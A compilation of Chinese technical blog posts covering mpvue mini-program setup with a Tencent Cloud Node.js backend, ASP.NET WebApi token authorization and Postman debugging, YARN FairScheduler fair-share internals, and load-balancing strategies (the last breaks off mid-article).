2.【设置】→【开发者工具】→第一次是git管理，开启腾讯云关联
3.会一路跳转到腾讯云的【开通开发环境】的流程要走

1.已经完成
2.下载安装微信开发者工具，也已经下载安装了
3.下载Node.js版本Demo
将demo中的server文件夹，复制到mpvue项目中
在项目下的project.config.json中，增加代码：

"qcloudRoot":"/server/",


 在server文件夹下的config.js中，在pass后填写Appid

 
 
 然后在微信开发者工具中，打开项目，点击右上角的【腾讯云】→【上传测试代码】
首次上传选【模块上传】，然后如图把相应的地方勾选，以后就选智能上传就可以了。

 2.搭建本地环境
1.安装MySQL数据库
2.配置本地server文件夹下的config.js，加入配置代码

    serverHost: 'localhost',
    tunnelServerUrl: '',
    tunnelSignatureKey: '27fb7d1c161b7ca52d73cce0f1d833f9f5b5ec89',
      // 腾讯云相关配置可以查看云 API 秘钥控制台：https://console.cloud.tencent.com/capi
    qcloudAppId: '你的appid',
    qcloudSecretId: '你的云api秘钥id',
    qcloudSecretKey: '你的云api秘钥key',
    wxMessageToken: 'weixinmsgtoken',
    networkTimeout: 30000,


 
 

获取云api秘钥id和key地址：https://console.cloud.tencent.com/capi


获取appid的地址：https://console.cloud.tencent.com/developer

 
 3.新建cAuth数据库
打开MySQL控制台，执行命令

create database cAuth;

 数据库名cAuth，是与server项目中保持一致。
如果本地的MySQL设置了密码，将server文件下的config.js中的数据库密码配置，填写你mysql数据库的密码

 
4.启动server服务端
打开cmd，cd到server项目目录下，执行

cnpm install

 

cnpm install -g nodemon

5.测试一下本地环境是否搭建好了
在server项目下controllers目录下，新建demo.js文件

module.exports=async(ctx)=>{
    ctx.state.data={
        msg:'hello 小程序后台'
    }
}

在server项目目录下的router目录下的index.js中添加路由

router.get('/demo',controllers.demo)


 
 然后执行运行server项目的命令

npm run dev //启动server项目

浏览器访问

http://localhost:5757/weapp/demo

.
 
 
 
3.项目初始化
1.新建mpvue项目 打开cmd，cd到想要存放项目的目录下

cnpm install -g vue-cli   //安装脚手架
vue init mpvue/mpvue-quickstart mydemo
Project name mydemo
wxmp appid //登录微信小程序后台，找到appid
//然后全都默认即可

cd mydemo
cnpm install
npm run dev//启动新建的mpvue项目

2.用vscode打开mydemo项目
1.将图片素材库文件夹img复制到mydemo/static目录下
2.在src目录下，新建me目录，目录下新建mian.js和index.vue
main.js代码

import Vue from 'vue'
import App from './index'

const app = new Vue(App)
app.$mount()

index.vue

<template>
    <div>
        个人中心页面
    </div>
</template>
<script>
export default {
    

}
</script>
<style>
    
</style>

3.在src目录下，新建books目录，目录下新建mian.js和index.vue
main.js代码

import Vue from 'vue'
import App from './index'

const app = new Vue(App)
app.$mount()

index.vue代码

<template>
    <div>
        图书页面
    </div>
</template>
<script>
export default {
    

}
</script>
<style>
    
</style>

4.在src目录下，新建comments目录，目录下新建mian.js和index.vue
main.js代码

import Vue from 'vue'
import App from './index'

const app = new Vue(App)
app.$mount()

index.vue代码

<template>
    <div>
        评论过的书页面
    </div>
</template>
<script>
export default {
    

}
</script>
<style>
    
</style>

嗯，是的，3，4，5步骤中，main.js 的代码是一样的，index.vue代码基本一样
5.防止代码格式报错导致项目无法启动，先到项目目录下的build目录下的webpack.base.conf.js中，将一段配置代码注释掉

6.在mydemo项目下的app.json中修改添加配置代码
app.json代码

{
  "pages": [
    "pages/books/main", //将哪个页面路径放第一个，哪个页面就是首页，加^根本不好使，而且还报错
    "pages/comments/main",
    "pages/me/main",
    "pages/index/main",
    "pages/logs/main",
    "pages/counter/main"
  ],
  "window": {
    "backgroundTextStyle": "light",
    "navigationBarBackgroundColor": "#EA5149",
    "navigationBarTitleText": "蜗牛图书",
    "navigationBarTextStyle": "light"
  }

  
}

7.在cmd中重启mydemo项目，在微信开发者工具中打开

 
 3.底部导航
1.微信公众平台小程序全局配置文档地址

https://developers.weixin.qq.com/miniprogram/dev/framework/config.html#全局配置

2.根据官方文档，在app.json填写底部导航配置代码

{
  "pages": [
    "pages/books/main",
    "pages/comments/main",
    "pages/me/main",
    "pages/index/main",
    "pages/logs/main",
    "pages/counter/main"
  ],
  "window": {
    "backgroundTextStyle": "light",
    "navigationBarBackgroundColor": "#EA5149",
    "navigationBarTitleText": "蜗牛图书",
    "navigationBarTextStyle": "light"
  },
  "tabBar": {
    "selectedColor":"#EA5149",
    "list": [{

      "pagePath": "pages/books/main",
      "text": "图书",
      "iconPath":"static/img/book.png",
      "selectedIconPath":"static/img/book-active.png"
    },
    {

      "pagePath": "pages/comments/main",
      "text": "评论",
      "iconPath":"static/img/todo.png",
      "selectedIconPath":"static/img/todo-active.png"
    },
    {

      "pagePath": "pages/me/main",
      "text": "我",
      "iconPath":"static/img/me.png",
      "selectedIconPath":"static/img/me-active.png"
    }
  ]
  }

  
}

3.效果图

 
 4.代码封装
 1.打开cmd，cd到server下，运行后端

npm run dev

2.在mydemo/src 目录下，新建config.js

//配置项

const host="http://localhost:5757"

const config={
    host
}
export default config

3.在src目录下新建until.js

//工具函数

import config from './config'

export function get(url){
    return new Promise((reslove,reject)=>{
        wx.request({
            url:config.host+url,
            success:function(res){
                if(res.data.code===0){
                    reslove(res.data.data)
                }else{
                    reject(res.data)
                }
            }
        })
    })
}

4.App.vue中添加代码

<script>
import {get} from './until'

export default {
  async created () {
    // 调用API从本地缓存中获取数据
    const logs = wx.getStorageSync('logs') || []
    logs.unshift(Date.now())
    wx.setStorageSync('logs', logs)

    const res=await get('/weapp/demo')
    console.log(123,res)
    console.log('小程序启动了')
  }
}
</script>

<style>
.container {
  height: 100%;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: space-between;
  padding: 200rpx 0;
  box-sizing: border-box;
}
/* this rule will be remove */
* {
  transition: width 2s;
  -moz-transition: width 2s;
  -webkit-transition: width 2s;
  -o-transition: width 2s;
}
</style>


5.在微信开发者工具中，在右上角点击【详情】，勾选不校验合法域名

6.运行mydemo

npm run dev


 
 5.使用ESLint自动规范代码
1.将mydemo/build/webpck.base.conf.js中之前注释的代码恢复

2.在mydemo项目下的package.json中的“lint”配置中加入--fix

3.执行代码，规范代码

npm run lint//如果一般的格式错误，就会自动修改，如果有代码上的错误，则会报出位置错误

4.执行运行代码

npm run dev

发现已经不报错啦！
********************************************************************************************************************************************************************************************************
ASP.NET MVC5+EF6+EasyUI 后台管理系统-WebApi的用法与调试
1：ASP.NET MVC5+EF6+EasyUI 后台管理系统（1）-WebApi与Unity注入 使用Unity是为了使用我们后台的BLL和DAL层
2：ASP.NET MVC5+EF6+EasyUI 后台管理系统（2）-WebApi与Unity注入-配置文件
3：ASP.NET MVC5+EF6+EasyUI 后台管理系统（3）-MVC WebApi 用户验证 (1)
4：ASP.NET MVC5+EF6+EasyUI 后台管理系统（4）-MVC WebApi 用户验证 (2)

以往我们讲了WebApi的基础验证，但是有新手经常来问我使用的方式
这次我们来分析一下代码的用法，以及调试的方式
WebApi在一些场景我们会用到，比如：

1.对接各种客户端（移动设备）
2.构建常见的http微服务 
3.开放数据 
4.单点登陆  等...


本文主要演示几点：主要也是对以往的回顾整理

1.使用HelpPage文档
2.Postman对接口进行调试（之前的样例太过简单，这次加一些参数，让初学者多看到这些场景）
3.调试接口

1.HelpPage Api帮助文档
我们新建的WebApi集成了微软自带的HelpPage，即Api的文档，在我们编写好接口之后会自动生成一份文档
配置HelpPage，非常简单，分两步
设置项目属性的输出XML文档

2.打开Areas-->HelpPage-->App_Start-->HelpPageConfig.cs

    public static void Register(HttpConfiguration config)
        {
            //// Uncomment the following to use the documentation from XML documentation file.
            config.SetDocumentationProvider(new XmlDocumentationProvider(HttpContext.Current.Server.MapPath("~/bin/Apps.WebApi.XML")));

设置Register方法就行，运行地址localhost:1593/help得到如下结果

从图中可以看出，每一个控制器的接口都会列出来，并根据注释和参数生成文档，全自动
点击接口可以看到参数和请求方式

2.使用Postman调试
下载地址：https://www.getpostman.com/
Pastman非常易用，我们下面就拿登陆接口来测试

打开Postman，新建一个请求

OK，我们已经获得token！注意，新建请求的时候，要设置GET,POST
 
3.验证权限
之前的文章，我们是通过令牌的方式+接口权限来访问接口数据的
打开SupperFilter.cs过滤器代码

//url获取token
            var content = actionContext.Request.Properties[ConfigPara.MS_HttpContext] as HttpContextBase;

            var token = content.Request.QueryString[ConfigPara.Token];
            if (!string.IsNullOrEmpty(token))
            {
                //解密用户ticket,并校验用户名密码是否匹配

                //读取请求上下文中的Controller,Action,Id
                var routes = new RouteCollection();
                RouteConfig.RegisterRoutes(routes);
                RouteData routeData = routes.GetRouteData(content);
                //取出区域的控制器Action,id
                string controller = actionContext.ActionDescriptor.ControllerDescriptor.ControllerName;
                string action = actionContext.ActionDescriptor.ActionName;
                //URL路径
                string filePath = HttpContext.Current.Request.FilePath;
                //判断token是否有效
                if (!LoginUserManage.ValidateTicket(token))
                {
                    HandleUnauthorizedRequest(actionContext);
                }

                //判断是否角色组授权（如果不需要使用角色组授权可以注释掉这个方法，这样就是登录用户都可以访问所有接口）
                if (!ValiddatePermission(token, controller, action, filePath))
                {
                    HandleUnauthorizedRequest(actionContext);
                }

                //已经登录，有权限
                base.IsAuthorized(actionContext);

过滤器中会读取到用户传过来的token并进行2个逻辑验证
1.验证token是否有效
2.验证接口有没有权限（通过后台分配权限来获取Action）这个操作跟我们授权界面是一样的 
（注：如果注释掉即所有登陆用户都可以访问所有接口，不受控制，主要看业务场景吧）
 
4.通过Token向其他接口拿数据
看到SysSampleController类，这个类和普通MVC里面的样例的接口其实没有什么区别，BLL后的所有都是通用的，所以逻辑就不需要重新写了！按照第二点的获得token，配置到Postman可以获得数据

1.查询

2.创建

3.修改

4.获取明细

5.删除
 

 谢谢，从源码直接可以看出，和自己测试或者自己配置一遍，不失是一种体验

 
********************************************************************************************************************************************************************************************************
别被官方文档迷惑了！这篇文章帮你详解yarn公平调度
欢迎大家前往腾讯云+社区，获取更多腾讯海量技术实践干货哦~

本文由@edwinhzhang发表于云+社区专栏

FairScheduler是yarn常用的调度器，但是仅仅参考官方文档，有很多参数和概念文档里没有详细说明，但是这些参明显会影响到集群的正常运行。本文的主要目的是通过梳理代码将关键参数的功能理清楚。下面列出官方文档中常用的参数：



yarn.scheduler.fair.preemption.cluster-utilization-threshold
The utilization threshold after which preemption kicks in. The utilization is computed as the maximum ratio of usage to capacity among all resources. Defaults to 0.8f.




yarn.scheduler.fair.update-interval-ms
The interval at which to lock the scheduler and recalculate fair shares, recalculate demand, and check whether anything is due for preemption. Defaults to 500 ms.


maxAMShare
limit the fraction of the queue’s fair share that can be used to run application masters. This property can only be used for leaf queues. For example, if set to 1.0f, then AMs in the leaf queue can take up to 100% of both the memory and CPU fair share. The value of -1.0f will disable this feature and the amShare will not be checked. The default value is 0.5f.


minSharePreemptionTimeout
number of seconds the queue is under its minimum share before it will try to preempt containers to take resources from other queues. If not set, the queue will inherit the value from its parent queue.


fairSharePreemptionTimeout
number of seconds the queue is under its fair share threshold before it will try to preempt containers to take resources from other queues. If not set, the queue will inherit the value from its parent queue.


fairSharePreemptionThreshold
If the queue waits fairSharePreemptionTimeout without receiving fairSharePreemptionThreshold*fairShare resources, it is allowed to preempt containers to take resources from other queues. If not set, the queue will inherit the value from its parent queue.



在上述参数描述中，timeout等参数值没有给出默认值，没有告知不设置会怎样。minShare,fairShare等概念也没有说清楚，很容易让人云里雾里。关于这些参数和概念的详细解释，在下面的分析中一一给出。
FairScheduler整体结构
 图（1） FairScheduler 运行流程图
公平调度器的运行流程就是RM去启动FairScheduler,SchedulerDispatcher两个服务，这两个服务各自负责update线程，handle线程。
update线程有两个任务：（1）更新各个队列的资源（Instantaneous Fair Share）,（2）判断各个leaf队列是否需要抢占资源（如果开启抢占功能）
handle线程主要是处理一些事件响应，比如集群增加节点，队列增加APP，队列删除APP，APP更新container等。
FairScheduler类图
图（2） FairScheduler相关类图
队列继承模块：yarn通过树形结构来管理队列。从管理资源角度来看，树的根节点root队列（FSParentQueue）,非根节点（FSParentQueue），叶子节点（FSLeaf）,app任务（FSAppAttempt，公平调度器角度的App）都是抽象的资源，它们都实现了Schedulable接口，都是一个可调度资源对象。它们都有自己的fair share（队列的资源量）方法（这里又用到了fair share概念），weight属性（权重）、minShare属性（最小资源量）、maxShare属性(最大资源量)，priority属性(优先级)、resourceUsage属性（资源使用量属性）以及资源需求量属性(demand)，同时也都实现了preemptContainer抢占资源的方法，assignContainer方法（为一个ACCEPTED的APP分配AM的container）。
public interface Schedulable {
  /**
   * Name of job/queue, used for debugging as well as for breaking ties in
   * scheduling order deterministically.
   */
  public String getName();

  /**
   * Maximum number of resources required by this Schedulable. This is defined as
   * number of currently utilized resources + number of unlaunched resources (that
   * are either not yet launched or need to be speculated).
   */
  public Resource getDemand();

  /** Get the aggregate amount of resources consumed by the schedulable. */
  public Resource getResourceUsage();

  /** Minimum Resource share assigned to the schedulable. */
  public Resource getMinShare();

  /** Maximum Resource share assigned to the schedulable. */
  public Resource getMaxShare();

  /** Job/queue weight in fair sharing. */
  public ResourceWeights getWeights();

  /** Start time for jobs in FIFO queues; meaningless for QueueSchedulables.*/
  public long getStartTime();

 /** Job priority for jobs in FIFO queues; meaningless for QueueSchedulables. */
  public Priority getPriority();

  /** Refresh the Schedulable's demand and those of its children if any. */
  public void updateDemand();

  /**
   * Assign a container on this node if possible, and return the amount of
   * resources assigned.
   */
  public Resource assignContainer(FSSchedulerNode node);

  /**
   * Preempt a container from this Schedulable if possible.
   */
  public RMContainer preemptContainer();

  /** Get the fair share assigned to this Schedulable. */
  public Resource getFairShare();

  /** Assign a fair share to this Schedulable. */
  public void setFairShare(Resource fairShare);
}
队列运行模块：从类图角度描述公平调度的工作原理。SchedulerEventDispatcher类负责管理handle线程。FairScheduler类管理update线程，通过QueueManager获取所有队列信息。
我们从Instantaneous Fair Share 和Steady Fair Share 这两个yarn的基本概念开始进行代码分析。
Instantaneous Fair Share & Steady Fair Share
Fair Share指的都是Yarn根据每个队列的权重、最大，最小可运行资源计算的得到的可以分配给这个队列的最大可用资源。本文描述的是公平调度，公平调度的默认策略FairSharePolicy的规则是single-resource，即只关注内存资源这一项指标。
Steady Fair Share：是每个队列内存资源量的固定理论值。Steady Fair Share在RM初期工作后不再轻易改变，只有后续在增加节点（addNode）时才会重新计算。RM的初期工作也是handle线程把集群的每个节点添加到调度器中（addNode）。
Instantaneous Fair Share：是每个队列的内存资源量的实际值，是在动态变化的。yarn里的fair share如果没有专门指代，都是指的的Instantaneous Fair Share。
1 Steady Fair Share计算方式
 图（3） steady fair share 计算流程
handle线程如果接收到NODE_ADDED事件，会去调用addNode方法。
  private synchronized void addNode(RMNode node) {
    FSSchedulerNode schedulerNode = new FSSchedulerNode(node, usePortForNodeName);
    nodes.put(node.getNodeID(), schedulerNode);
    //将该节点的内存加入到集群总资源
    Resources.addTo(clusterResource, schedulerNode.getTotalResource());
    //更新available资源
    updateRootQueueMetrics();
    //更新一个container的最大分配，就是UI界面里的MAX（如果没有记错的话）
    updateMaximumAllocation(schedulerNode, true);

    //设置root队列的steadyFailr=clusterResource的总资源
    queueMgr.getRootQueue().setSteadyFairShare(clusterResource);
    //重新计算SteadyShares
    queueMgr.getRootQueue().recomputeSteadyShares();
    LOG.info("Added node " + node.getNodeAddress() +
        " cluster capacity: " + clusterResource);
  }
recomputeSteadyShares 使用广度优先遍历计算每个队列的内存资源量，直到叶子节点。
 public void recomputeSteadyShares() {
    //广度遍历整个队列树
    //此时getSteadyFairShare 为clusterResource
    policy.computeSteadyShares(childQueues, getSteadyFairShare());
    for (FSQueue childQueue : childQueues) {
      childQueue.getMetrics().setSteadyFairShare(childQueue.getSteadyFairShare());
      if (childQueue instanceof FSParentQueue) {
        ((FSParentQueue) childQueue).recomputeSteadyShares();
      }
    }
  }
computeSteadyShares方法计算每个队列应该分配到的内存资源，总体来说是根据每个队列的权重值去分配，权重大的队列分配到的资源更多，权重小的队列分配到得资源少。但是实际的细节还会受到其他因素影响，是因为每队列有minResources和maxResources两个参数来限制资源的上下限。computeSteadyShares最终去调用computeSharesInternal方法。比如以下图为例：
图中的数字是权重，假如有600G的总资源，parent=300G,leaf1=300G,leaf2=210G,leaf3=70G。
图（4） yarn队列权重
computeSharesInternal方法概括来说就是通过二分查找法寻找到一个资源比重值R（weight-to-slots），使用这个R为每个队列分配资源（在该方法里队列的类型是Schedulable,再次说明队列是一个资源对象），公式是steadyFairShare=R * QueueWeights。
computeSharesInternal是计算Steady Fair Share 和Instantaneous Fair Share共用的方法，根据参数isSteadyShare来区别计算。
之所以要做的这么复杂，是因为队列不是单纯的按照比例来分配资源的（单纯按权重比例，需要maxR,minR都不设置。maxR的默认值是0x7fffffff，minR默认值是0）。如果设置了maxR,minR,按比例分到的资源小于minR,那么必须满足minR。按比例分到的资源大于maxR，那么必须满足maxR。因此想要找到一个R（weight-to-slots）来尽可能满足：

R*（Queue1Weights + Queue2Weights+...+QueueNWeights） <=totalResource
R*QueueWeights >= minShare
R*QueueWeights <= maxShare

注：QueueNWeights为队列各自的权重，minShare和maxShare即各个队列的minResources和maxResources
computcomputeSharesInternal详细来说分为四个步骤：

确定可用资源：totalResources = min(totalResources-takenResources(fixedShare), totalMaxShare)
确定R上下限
二分查找法逼近R
使用R设置fair Share

  private static void computeSharesInternal(
      Collection<? extends Schedulable> allSchedulables,
      Resource totalResources, ResourceType type, boolean isSteadyShare) {

    Collection<Schedulable> schedulables = new ArrayList<Schedulable>();
    //第一步
    //排除有固定资源不能动的队列,并得出固定内存资源
    int takenResources = handleFixedFairShares(
        allSchedulables, schedulables, isSteadyShare, type);

    if (schedulables.isEmpty()) {
      return;
    }
    // Find an upper bound on R that we can use in our binary search. We start
    // at R = 1 and double it until we have either used all the resources or we
    // have met all Schedulables' max shares.
    int totalMaxShare = 0;
    //遍历schedulables（非固定fixed队列），将各个队列的资源相加得到totalMaxShare
    for (Schedulable sched : schedulables) {
      int maxShare = getResourceValue(sched.getMaxShare(), type);
      totalMaxShare = (int) Math.min((long)maxShare + (long)totalMaxShare,
          Integer.MAX_VALUE);
      if (totalMaxShare == Integer.MAX_VALUE) {
        break;
      }
    }
    //总资源要减去fiexd share
    int totalResource = Math.max((getResourceValue(totalResources, type) -
        takenResources), 0);
    //队列所拥有的最大资源是有集群总资源和每个队列的MaxResource双重限制
    totalResource = Math.min(totalMaxShare, totalResource);
    //第二步:设置R的上下限
    double rMax = 1.0;
    while (resourceUsedWithWeightToResourceRatio(rMax, schedulables, type)
        < totalResource) {
      rMax *= 2.0;
    }

    //第三步：二分法逼近合理R值
    // Perform the binary search for up to COMPUTE_FAIR_SHARES_ITERATIONS steps
    double left = 0;
    double right = rMax;
    for (int i = 0; i < COMPUTE_FAIR_SHARES_ITERATIONS; i++) {
      double mid = (left + right) / 2.0;
      int plannedResourceUsed = resourceUsedWithWeightToResourceRatio(
          mid, schedulables, type);
      if (plannedResourceUsed == totalResource) {
        right = mid;
        break;
      } else if (plannedResourceUsed < totalResource) {
        left = mid;
      } else {
        right = mid;
      }
    }
    //第四步：使用R值设置，确定各个非fixed队列的fairShar,意味着只有活跃队列可以分资源
    // Set the fair shares based on the value of R we've converged to
    for (Schedulable sched : schedulables) {
      if (isSteadyShare) {
        setResourceValue(computeShare(sched, right, type),
            ((FSQueue) sched).getSteadyFairShare(), type);
      } else {
        setResourceValue(
            computeShare(sched, right, type), sched.getFairShare(), type);
      }
    }
  }
(1) 确定可用资源
handleFixedFairShares方法来统计出所有fixed队列的fixed内存资源（fixedShare）相加，并且fixed队列排除掉不得瓜分系统资源。yarn确定fixed队列的标准如下：
  private static int getFairShareIfFixed(Schedulable sched,
      boolean isSteadyShare, ResourceType type) {

    //如果队列的maxShare <=0  则是fixed队列，fixdShare=0
    if (getResourceValue(sched.getMaxShare(), type) <= 0) {
      return 0;
    }

    //如果是计算Instantaneous Fair Share,并且该队列内没有APP再跑，
    // 则是fixed队列，fixdShare=0
    if (!isSteadyShare &&
        (sched instanceof FSQueue) && !((FSQueue)sched).isActive()) {
      return 0;
    }

    //如果队列weight<=0,则是fixed队列
    //如果对列minShare <=0,fixdShare=0,否则fixdShare=minShare
    if (sched.getWeights().getWeight(type) <= 0) {
      int minShare = getResourceValue(sched.getMinShare(), type);
      return (minShare <= 0) ? 0 : minShare;
    }

    return -1;
  }
(2)确定R上下限
R的下限为1.0，R的上限是由resourceUsedWithWeightToResourceRatio方法来确定。该方法确定的资源值W，第一步中确定的可用资源值T：W>=T时，R才能确定。
//根据R值去计算每个队列应该分配的资源
  private static int resourceUsedWithWeightToResourceRatio(double w2rRatio,
      Collection<? extends Schedulable> schedulables, ResourceType type) {
    int resourcesTaken = 0;
    for (Schedulable sched : schedulables) {
      int share = computeShare(sched, w2rRatio, type);
      resourcesTaken += share;
    }
    return resourcesTaken;
  }
 private static int computeShare(Schedulable sched, double w2rRatio,
      ResourceType type) {
    //share=R*weight,type是内存
    double share = sched.getWeights().getWeight(type) * w2rRatio;
    share = Math.max(share, getResourceValue(sched.getMinShare(), type));
    share = Math.min(share, getResourceValue(sched.getMaxShare(), type));
    return (int) share;
  }
（3）二分查找法逼近R
满足下面两个条件中的一个即可终止二分查找：

W == T(步骤2中的W和T)
超过25次（COMPUTE_FAIR_SHARES_ITERATIONS）

（4）使用R设置fair share
设置fair share时，可以看到区分了Steady Fair Share 和Instantaneous Fair Share。
  for (Schedulable sched : schedulables) {
      if (isSteadyShare) {
        setResourceValue(computeShare(sched, right, type),
            ((FSQueue) sched).getSteadyFairShare(), type);
      } else {
        setResourceValue(
            computeShare(sched, right, type), sched.getFairShare(), type);
      }
    }
2 Instaneous Fair Share计算方式
图（5）Instaneous Fair Share 计算流程
该计算方式与steady fair的计算调用栈是一致的，最终都要使用到computeSharesInternal方法，唯一不同的是计算的时机不一样。steady fair只有在addNode的时候才会重新计算一次，而Instantaneous Fair Share是由update线程定期去更新。
此处强调的一点是，在上文中我们已经分析如果是计算Instantaneous Fair Share，并且队列为空，那么该队列就是fixed队列，也就是非活跃队列，那么计算fair share时，该队列是不会去瓜分集群的内存资源。
而update线程的更新频率就是由 yarn.scheduler.fair.update-interval-ms来决定的。
private class UpdateThread extends Thread {

    @Override
    public void run() {
      while (!Thread.currentThread().isInterrupted()) {
        try {
          //yarn.scheduler.fair.update-interval-ms
          Thread.sleep(updateInterval);
          long start = getClock().getTime();
          // 更新Instantaneous Fair Share
          update();
          //抢占资源
          preemptTasksIfNecessary();
          long duration = getClock().getTime() - start;
          fsOpDurations.addUpdateThreadRunDuration(duration);
        } catch (InterruptedException ie) {
          LOG.warn("Update thread interrupted. Exiting.");
          return;
        } catch (Exception e) {
          LOG.error("Exception in fair scheduler UpdateThread", e);
        }
      }
    }
  }
3 maxAMShare意义
handle线程如果接收到NODE_UPDATE事件，如果（1）该node的机器内存资源满足条件，（2）并且有ACCEPTED状态的Application，那么将会为该待运行的APP的AM分配一个container，使该APP在所处的queue中跑起来。但在分配之前还需要一道检查canRuunAppAM。能否通过canRuunAppAM,就是由maxAMShare参数限制。
  public boolean canRunAppAM(Resource amResource) {
    //默认是0.5f
    float maxAMShare =
        scheduler.getAllocationConfiguration().getQueueMaxAMShare(getName());
    if (Math.abs(maxAMShare - -1.0f) < 0.0001) {
      return true;
    }
    //该队的maxAMResource=maxAMShare * fair share(Instantaneous Fair Share)
    Resource maxAMResource = Resources.multiply(getFairShare(), maxAMShare);
    //amResourceUsage是该队列已经在运行的App的AM所占资源累加和
    Resource ifRunAMResource = Resources.add(amResourceUsage, amResource);
    //查看当前ifRunAMResource是否超过maxAMResource
    return !policy
        .checkIfAMResourceUsageOverLimit(ifRunAMResource, maxAMResource);
  }
上面代码我们用公式来描述：

队列中运行的APP为An，每个APP的AM占用资源为R
ACCEPTED状态（待运行）的APP的AM大小为R1
队列的fair share为QueFS
队列的maxAMResource=maxAMShare * QueFS
ifRunAMResource=A1.R+A2.R+...+An.R+R1
ifRunAMResource > maxAMResource，则该队列不能接纳待运行的APP

之所以要关注这个参数，是因为EMR很多客户在使用公平队列时会反映集群的总资源没有用满，但是还有APP在排队，没有跑起来，如下图所示：
图（6） APP阻塞实例
公平调度默认策略不关心Core的资源，只关心Memory。图中Memory用了292G，还有53.6G的内存没用，APP就可以阻塞。原因就是default队列所有运行中APP的AM资源总和超过了（345.6 * 0.5），导致APP阻塞。
总结
通过分析fair share的计算流程，搞清楚yarn的基本概念和部分参数，从下面的表格对比中，我们也可以看到官方的文档对概念和参数的描述是比较难懂的。剩余的参数放在第二篇-公平调度之抢占中分析。




官方描述
总结




Steady Fair Share
The queue’s steady fair share of resources. These shares consider all the queues irrespective of whether they are active (have running applications) or not. These are computed less frequently and change only when the configuration or capacity changes.They are meant to provide visibility into resources the user can expect, and hence displayed in the Web UI.
每个非fixed队列内存资源量的固定理论值。Steady Fair Share在RM初期工作后不再轻易改变，只有后续在增加节点改编配置（addNode）时才会重新计算。RM的初期工作也是handle线程把集群的每个节点添加到调度器中（addNode）。


Instantaneous Fair Share
The queue’s instantaneous fair share of resources. These shares consider only actives queues (those with running applications), and are used for scheduling decisions. Queues may be allocated resources beyond their shares when other queues aren’t using them. A queue whose resource consumption lies at or below its instantaneous fair share will never have its containers preempted.
每个非fixed队列(活跃队列)的内存资源量的实际值，是在动态变化的，由update线程去定时更新队列的fair share。yarn里的fair share如果没有专门指代，都是指的的Instantaneous Fair Share。


yarn.scheduler.fair.update-interval-ms
The interval at which to lock the scheduler and recalculate fair shares, recalculate demand, and check whether anything is due for preemption. Defaults to 500 ms.
update线程的间隔时间，该线程的工作是1更新fair share，2检查是否需要抢占资源。


maxAMShare
limit the fraction of the queue’s fair share that can be used to run application masters. This property can only be used for leaf queues. For example, if set to 1.0f, then AMs in the leaf queue can take up to 100% of both the memory and CPU fair share. The value of -1.0f will disable this feature and the amShare will not be checked. The default value is 0.5f.
队列所有运行中的APP的AM资源总和必须不能超过maxAMShare * fair share




问答
如何将yarn 升级到特定版本？
相关阅读
Yarn与Mesos
Spark on Yarn | Spark，从入门到精通
YARN三大模块介绍
【每日课程推荐】机器学习实战！快速入门在线广告业务及CTR相应知识

此文已由作者授权腾讯云+社区发布，更多原文请点击
搜索关注公众号「云加社区」，第一时间获取技术干货，关注后回复1024 送你一份技术课程大礼包！
海量技术实践经验，尽在云加社区！

********************************************************************************************************************************************************************************************************
分布式系统关注点——仅需这一篇，吃透「负载均衡」妥妥的

本文长度为3426字，预计读完需1.2MB流量，建议阅读9分钟。

 
阅读目录





「负载均衡」是什么？
常用「负载均衡」策略图解
常用「负载均衡」策略优缺点和适用场景
用「健康探测」来保障高可用
结语





 
 
　　上一篇《分布式系统关注点——初识「高可用」》我们对「高可用」有了一个初步认识，其中认为「负载均衡」是「高可用」的核心工作。那么，本篇将通过图文并茂的方式，来描述出每一种负载均衡策略的完整样貌。
 
 

一、「负载均衡」是什么
        正如题图所示的这样，由一个独立的统一入口来收敛流量，再做二次分发的过程就是「负载均衡」，它的本质和「分布式系统」一样，是「分治」。
 
        如果大家习惯了开车的时候用一些导航软件，我们会发现，导航软件的推荐路线方案会有一个数量的上限，比如3条、5条。因此，其实本质上它也起到了一个类似「负载均衡」的作用，因为如果只能取Top3的通畅路线，自然拥堵严重的路线就无法推荐给你了，使得车流的压力被分摊到了相对空闲的路线上。
 
        在软件系统中也是一样的道理，为了避免流量分摊不均，造成局部节点负载过大（如CPU吃紧等），所以引入一个独立的统一入口来做类似上面的“导航”的工作。但是，软件系统中的「负载均衡」与导航的不同在于，导航是一个柔性策略，最终还是需要使用者做选择，而前者则不同。
 
        怎么均衡的背后是策略在起作用，而策略的背后是由某些算法或者说逻辑来组成的。比如，导航中的算法属于「路径规划」范畴，在这个范畴内又细分为「静态路径规划」和「动态路径规划」，并且，在不同的分支下还有各种具体计算的算法实现，如Dijikstra、A*等。同样的，在软件系统中的负载均衡，也有很多算法或者说逻辑在支撑着这些策略，巧的是也有静态和动态之分。
 
 

二、常用「负载均衡」策略图解
        下面来罗列一下日常工作中最常见的5种策略。
 
01  轮询
 
　　这是最常用也最简单策略，平均分配，人人都有、一人一次。大致的代码如下。
 

int  globalIndex = 0;   //注意是全局变量，不是局部变量。

try
{

    return servers[globalIndex];
}
finally
{
    globalIndex++;
    if (globalIndex == 3)
        globalIndex = 0;
}

 
02  加权轮询

        在轮询的基础上，增加了一个权重的概念。权重是一个泛化后的概念，可以用任意方式来体现，本质上是一个能者多劳思想。比如，可以根据宿主的性能差异配置不同的权重。大致的代码如下。
 

int matchedIndex = -1;
int total = 0;
for (int i = 0; i < servers.Length; i++)
{
      servers[i].cur_weight += servers[i].weight;//①每次循环的时候做自增（步长=权重值）
      total += servers[i].weight;//②将每个节点的权重值累加到汇总值中
      if (matchedIndex == -1 || servers[matchedIndex].cur_weight < servers[i].cur_weight) //③如果 当前节点的自增数 > 当前待返回节点的自增数，则覆盖。
      {
            matchedIndex = i;
      }
}

servers[matchedIndex].cur_weight -= total;//④被选取的节点减去②的汇总值，以降低下一次被选举时的初始权重值。
return servers[matchedIndex];

 
        这段代码的过程如下图的表格。"()"中的数字就是自增数，代码中的cur_weight。
 

 
        值得注意的是，加权轮询本身还有不同的实现方式，虽说最终的比例都是2：1：2。但是在请求送达的先后顺序上可以所有不同。比如「5-4，3，2-1」和上面的案例相比，最终比例是一样的，但是效果不同。「5-4，3，2-1」更容易产生并发问题，导致服务端拥塞，且这个问题随着权重数字越大越严重。例子：10：5：3的结果是「18-17-16-15-14-13-12-11-10-9，8-7-6-5-4，3-2-1」 
 
03  最少连接数

        这是一种根据实时的负载情况，进行动态负载均衡的方式。维护好活动中的连接数量，然后取最小的返回即可。大致的代码如下。
 

var matchedServer = servers.orderBy(e => e.active_conns).first();

matchedServer.active_conns += 1;

return matchedServer;

//在连接关闭时还需对active_conns做减1的动作。

 
04  最快响应

